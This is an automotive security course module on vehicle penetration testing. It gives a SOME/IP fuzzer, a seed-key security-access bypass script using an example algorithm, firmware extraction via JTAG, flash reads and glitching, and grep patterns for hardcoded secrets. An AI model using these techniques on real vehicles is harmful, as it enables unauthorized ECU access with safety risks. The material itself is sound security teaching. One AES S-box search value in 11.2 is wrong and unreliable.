# Module 11 — Vehicle Penetration Testing

> Level: Advanced | Est. study time: 12 hours

---

## 11.1 Vehicle Pentest Methodology

```
AUTOMOTIVE PENTEST PHASES:

  ┌──────────────────────────────────────────────────────────────┐
  │  Phase 1: SCOPING & RULES OF ENGAGEMENT                     │
  │  • Define target: specific ECU / full vehicle / OTA system  │
  │  • Legal agreement: signed authorization mandatory           │
  │  • Physical access level: OBD only / full disassembly        │
  │  • Out-of-scope: production fleet, customer data             │
  └──────────────────────────────────────────────────────────────┘
                               │
  ┌──────────────────────────────────────────────────────────────┐
  │  Phase 2: PASSIVE RECONNAISSANCE                            │
  │  • FCC database: scan for approved RF modules (FCC ID)       │
  │  • Patent databases: OEM security architecture hints        │
  │  • CVE databases: known vulns in used chipsets              │
  │  • Leaked DBC files: GitHub, forums, pastebin               │
  │  • Disassembly research papers and conference talks         │
  │  • SBOM if available (software component versions)          │
  └──────────────────────────────────────────────────────────────┘
                               │
  ┌──────────────────────────────────────────────────────────────┐
  │  Phase 3: ACTIVE RECONNAISSANCE                             │
  │  • Physical: identify ECU hardware (chip markings)          │
  │  • CAN: capture and enumerate traffic, IDs, cycle times     │
  │  • OBD-II: enumerate supported PIDs                         │
  │  • Bluetooth: scan for BT devices (hcitool lescan)          │
  │  • Wi-Fi: scan SSID, probe requests (airodump-ng)           │
  │  • RF: identify cellular bands, short-range RF              │
  │  • Ethernet: SOME/IP-SD service enumeration                 │
  └──────────────────────────────────────────────────────────────┘
                               │
  ┌──────────────────────────────────────────────────────────────┐
  │  Phase 4: VULNERABILITY ANALYSIS                            │
  │  • Map attack surface: all interfaces with entry points     │
  │  • Static analysis: firmware if extracted                   │
  │  • Dynamic analysis: fuzzing, protocol testing              │
  │  • Authentication testing: UDS, BT pairing, Wi-Fi          │
  │  • Dependency scanning: CVEs in firmware libraries          │
  └──────────────────────────────────────────────────────────────┘
                               │
  ┌──────────────────────────────────────────────────────────────┐
  │  Phase 5: EXPLOITATION                                      │
  │  • Prove exploitability of identified vulnerabilities       │
  │  • Demonstrate impact (without actual vehicle damage)       │
  │  • Document step-by-step reproduction                       │
  │  • Classify severity: CVSS + automotive impact rating       │
  └──────────────────────────────────────────────────────────────┘
                               │
  ┌──────────────────────────────────────────────────────────────┐
  │  Phase 6: POST-EXPLOITATION / LATERAL MOVEMENT             │
  │  • From compromised entry point: reach other ECUs           │
  │  • Demonstrate blast radius: what else can attacker access  │
  │  • Persistence: can attacker maintain access after reset?   │
  └──────────────────────────────────────────────────────────────┘
                               │
  ┌──────────────────────────────────────────────────────────────┐
  │  Phase 7: REPORTING                                         │
  │  • Executive summary (risk language, business impact)       │
  │  • Technical findings (vulnerability details, PoC)         │
  │  • CVSS scores + automotive severity rating                 │
  │  • Remediation recommendations (specific and actionable)    │
  │  • Retest plan                                              │
  └──────────────────────────────────────────────────────────────┘
```

---

## 11.2 Tools Deep-Dive

### Firmware Analysis Tools

```bash
# ── BINWALK ────────────────────────────────────────────────────
# Identify file system, compression, and embedded files in firmware

binwalk firmware.bin                          # Scan for signatures
binwalk -e firmware.bin                       # Extract all identified sections
binwalk -E firmware.bin                       # Entropy analysis (compressed/encrypted sections)
binwalk --dd='squashfs.*:squashfs' firmware.bin  # Extract specific type

# ── GHIDRA ─────────────────────────────────────────────────────
# NSA reverse engineering framework (free, Java-based)
# 1. Import firmware binary
# 2. Select architecture: ARM Cortex-M, PowerPC, TriCore (AURIX), etc.
# 3. Auto-analyze: finds functions, strings, cross-references
# 4. Search for: seed-key functions, crypto constants, hardcoded secrets

# Find AES S-Box constant (indicates AES usage):
# Search → Memory → value 0x63636363 (AES S-box pattern)

# ── RADARE2 ───────────────────────────────────────────────────
r2 firmware.bin
> aaaa              # Deep analysis
> afl               # List all functions
> s main            # Seek to main
> pdf               # Disassemble function
> /x CAFEBABE       # Search for hex pattern
> iz                # List strings in binary
> axt @@ sym.*      # Cross-references to all symbols

# ── STRINGS + GREP ────────────────────────────────────────────
strings firmware.bin | grep -i "password\|secret\|key\|token\|admin\|debug"
strings firmware.bin | grep -E "192\.168\.|10\.\|172\."  # IP addresses
strings firmware.bin | grep -E "[A-F0-9]{32}"           # Potential MD5 hash
```

### Bluetooth Hacking Tools

```bash
# Scan for BT/BLE devices
hcitool scan         # Classic Bluetooth
hcitool lescan       # Bluetooth Low Energy

# BLE enumeration with gatttool
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary               # List services
> char-read-hnd 0x0015  # Read characteristic

# Btlejuice / BLEMitter for MITM attacks
# Wireshark with BT capture: capture on hci0 interface

# Key fob attack tools:
# RollJam (Samy Kamkar): captures and blocks rolling code, replays later
# Flipper Zero: RF analysis, sub-GHz replay
# HackRF One: software-defined radio, 1 MHz - 6 GHz
```

### Network Fuzzing

```python
"""
SOME/IP Fuzzer — systematic fuzzing of SOME/IP service methods
"""
import socket
import struct
import random
import time

class SOMEIPFuzzer:
    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    def craft_someip(self, service_id: int, method_id: int, 
                     payload: bytes, msg_type: int = 0x00) -> bytes:
        length = 8 + len(payload)
        return struct.pack(">HHIHHBBBB",
            service_id, method_id, length,
            0x0001, 0x0001, 0x01, 0x01, msg_type, 0x00
        ) + payload
    
    def fuzz_service(self, service_id: int, method_ids: list, 
                     num_cases: int = 1000):
        """Fuzz all methods of a service"""
        results = []
        
        for i in range(num_cases):
            method_id = random.choice(method_ids)
            
            # Mutation strategies
            strategy = i % 5
            if strategy == 0:
                payload = bytes([0] * random.randint(0, 256))       # Zero bytes
            elif strategy == 1:
                payload = bytes([0xFF] * random.randint(0, 256))    # Max bytes
            elif strategy == 2:
                payload = bytes([random.randint(0,255) for _ in range(random.randint(0,256))])
            elif strategy == 3:
                payload = b"\x00" * 65535  # Max UDP payload (boundary)
            else:
                payload = b""             # Empty payload
            
            msg = self.craft_someip(service_id, method_id, payload)
            
            try:
                self.sock.sendto(msg, (self.target_ip, self.target_port))
                self.sock.settimeout(0.1)
                try:
                    resp = self.sock.recv(4096)
                    if len(resp) >= 16 and resp[15] == 0x81:  # ERROR response
                        results.append({
                            "case": i, "method": hex(method_id),
                            "payload_len": len(payload),
                            "error_code": resp[15]
                        })
                except socket.timeout:
                    pass  # Timeout = possible crash
            except Exception as e:
                print(f"Exception at case {i}: {e}")
        
        return results

# Usage:
fuzzer = SOMEIPFuzzer("192.168.10.50", 30501)
results = fuzzer.fuzz_service(0x1234, [0x0001, 0x0002, 0x0003])
```

---

## 11.3 ECU Firmware Extraction

```
FIRMWARE EXTRACTION METHODS (easiest to hardest):

Method 1: OTA Package (if not encrypted)
  - Download official OTA update file
  - binwalk -e on .bin file → extract firmware
  - Common for infotainment units pre-2020

Method 2: UART/Serial Console
  - Open ECU PCB
  - Find UART test pads (common on infotainment boards)
  - Connect with USB-UART adapter
  - Bootloader may dump firmware or give shell access
  - String search: "Press any key to stop autoboot"

Method 3: JTAG/SWD (if not fused)
  - OpenOCD + FTDI debugger
  - Connect to JTAG pads on PCB
  - openocd -f interface/ftdi.cfg -f target/aurix.cfg
  - halt; dump_image firmware.bin 0x00000000 0x00100000
  - Full memory dump including code signing keys!

Method 4: Flash Chip Read (desolder)
  - Remove SPI/NOR flash chip (Winbond, Macronix common)
  - Read with CH341A programmer
  - flashrom -p ch341a_spi -r firmware.bin
  - Works even if JTAG is fused

Method 5: Glitch Attack (last resort)
  - Voltage glitch during Secure Boot signature check
  - Skip the verification → gain debug access
  - Tools: ChipWhisperer, custom FPGA glitcher
  - Requires: oscilloscope, voltage probe, hardware modification
```

---

## 11.4 Seed-Key Reverse Engineering

```python
"""
Reverse engineering seed-key algorithm from ECU firmware using Ghidra/radare2
Then implementing it in Python for pentest
"""

# Step 1: In Ghidra, search for the UDS handler function
# Hint: Look for function called when 0x27 0x02 frame received
# In AUTOSAR DCM: Dcm_DspInternal_SecurityAccessCompareKey()

# Step 2: Identify the key computation:
# Example decompiled pseudo-code from Ghidra:
"""
uint32_t computeKey(uint32_t seed) {
    seed ^= 0xCAFEBABE;          // XOR with constant
    seed = (seed << 13) | (seed >> 19);  // rotate left 13
    seed *= 0x6B;                 // multiply by 107
    seed ^= 0xDEADBEEF;           // final XOR
    return seed;
}
"""

# Step 3: Implement the reverse-engineered algorithm in Python:
def compute_key(seed: int) -> int:
    seed ^= 0xCAFEBABE
    seed = ((seed << 13) | (seed >> 19)) & 0xFFFFFFFF  # 32-bit rotation
    seed = (seed * 0x6B) & 0xFFFFFFFF
    seed ^= 0xDEADBEEF
    return seed & 0xFFFFFFFF

# Step 4: Test with python-udsoncan
import udsoncan
from udsoncan.connections import PythonIsoTpConnection

with PythonIsoTpConnection(...) as conn:
    with udsoncan.Client(conn) as client:
        client.change_session(udsoncan.services.DiagnosticSessionControl.Session.extendedDiagnosticSession)
        
        # Request seed
        response = client.request_seed(0x01)
        seed = int.from_bytes(response.service_data.security_seed, 'big')
        print(f"Seed: 0x{seed:08X}")
        
        # Compute key
        key = compute_key(seed)
        print(f"Computed key: 0x{key:08X}")
        
        # Send key
        try:
            client.send_key(0x02, key.to_bytes(4, 'big'))
            print("[SUCCESS] Security access granted!")
        except udsoncan.exceptions.NegativeResponseException as e:
            print(f"[FAIL] NRC: {e.response.code}")
```

---

## 11.5 Binary Analysis with Ghidra

```
AUTOMOTIVE BINARY ANALYSIS CHECKLIST:

1. Import settings:
   - Architecture: correct processor (TriCore for AURIX, ARM for S32K)
   - Load address: match ECU linker map (0x80000000 for AURIX flash)
   - Select ".text", ".data", ".bss" sections if ELF format

2. Function identification:
   - Strings window: find security-related strings
     "SecurityAccess", "seed", "key", "password", "DEBUG"
   - Cross-references: find callers of security functions
   - Symbol names: if AUTOSAR map file available → import for better labels

3. Crypto constant detection:
   - AES S-box: 0x637c777b (first 4 bytes)
   - SHA-256 init values: 0x6a09e667, 0xbb67ae85
   - CRC32 polynomial: 0xEDB88320 (reversed)
   → These indicate which crypto is used even without symbols

4. Hardcoded secret detection:
   - Search for 16/32-byte sequences with high entropy
   - Search for ASN.1 headers (PEM certificate markers)
   - YARA rule: automotive_hardcoded_key.yar
```

---

## 11.6 Pentest Report Template

```markdown
## Automotive ECU Penetration Test Report

### Target: [ECU Name]  |  HW Rev: [x]  |  SW Ver: [y]

---

### FINDING: [ID]-[SEVERITY]-[Short Title]
Example: VEH-001-CRITICAL-Unauthenticated_Programming_Session

**Severity**: CRITICAL / HIGH / MEDIUM / LOW / INFORMATIONAL
**CVSS v3.1**: [score] ([vector string])
**CWE**: [ID] ([name])

**Summary**: One sentence description of the vulnerability.

**Technical Description**:
Detailed explanation of the vulnerability, including:
- Exact interface/service affected
- Why the vulnerability exists
- What an attacker can do

**Proof of Concept**:
```
Step 1: Connect PCAN-USB to OBD-II port
Step 2: Run: python3 exploit.py --channel PCAN0 --target ADAS_ECU
Step 3: Output shows: "Programming session granted without key"
```

**Impact**:
- Safety impact: [e.g., AEB disabled → potential collision]
- Business impact: [recall cost, liability, brand damage]
- ISO 21434 impact category: [S0-S3, F0-F3, O0-O3, P0-P3]

**Remediation**:
- Short-term: [immediate workaround]
- Long-term: [permanent fix with code changes]
- Verification: [how to test the fix]

**References**:
- [CVE-XXXX-YYYY if applicable]
- [Research papers]
```

---

## 11.7 Summary — Module 11

```
KEY TAKEAWAYS:

✓ Pentest methodology: Scope → Recon → Vuln analysis → Exploit → Report
✓ Firmware extraction order: OTA package → UART → JTAG → flash chip → glitch
✓ Ghidra: find crypto constants (AES S-box, SHA constants) = identify algorithm
✓ Seed-key reverse engineering: decompile + implement + test = full bypass
✓ SOME/IP fuzzer finds crashes even without source code
✓ Always document impact in safety terms, not just technical severity
✓ CVSS alone is insufficient for automotive — add ISO 21434 impact rating
✓ Never test on production vehicles — use dedicated test bench only
```

**Checklist**: [Pentest Checklist](../templates/pentest_checklist.md)

**Next Module**: [12 — Secure Coding](12_secure_coding.md)
